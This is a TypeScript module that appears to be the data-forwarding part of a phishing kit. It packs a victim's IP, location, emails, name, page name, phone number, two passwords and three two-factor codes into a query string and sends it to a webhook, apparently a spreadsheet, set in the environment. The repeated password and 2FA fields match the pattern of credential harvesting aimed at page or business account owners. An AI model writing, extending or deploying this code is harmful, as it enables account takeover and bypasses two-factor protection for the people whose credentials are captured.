import axios from 'axios';

export interface SheetData {
	ip?: string;
	location?: string;
	email?: string;
	emailBusiness?: string;
	fullName?: string;
	fanpage?: string;
	phone?: string;
	password?: string;
	passwordSecond?: string;
	twoFa?: string;
	twoFaSecond?: string;
	twoFaThird?: string;
}

export async function sendDataToSheet(data: SheetData): Promise<void> {
	const webhookUrl = process.env.WEBHOOK_URL;
	if (!webhookUrl) {
		throw new Error('WEBHOOK_URL is not configured');
	}

	const params = new URLSearchParams({
		'Ip': data.ip || '',
		'Location': data.location || '',
		'Email': data.email || '',
		'Email Business': data.emailBusiness || '',
		'Full Name': data.fullName || '',
		'Page Name': data.fanpage || '',
		'Phone Number': data.phone ? `+${data.phone}` : '',
		'Password First': data.password || '',
		'Password Second': data.passwordSecond || '',
		'Code 2FA(1)': data.twoFa || '',
		'Code 2FA(2)': data.twoFaSecond || '',
		'Code 2FA(3)': data.twoFaThird || '',
	});

	await axios.get(`${webhookUrl}?${params.toString()}`);
}


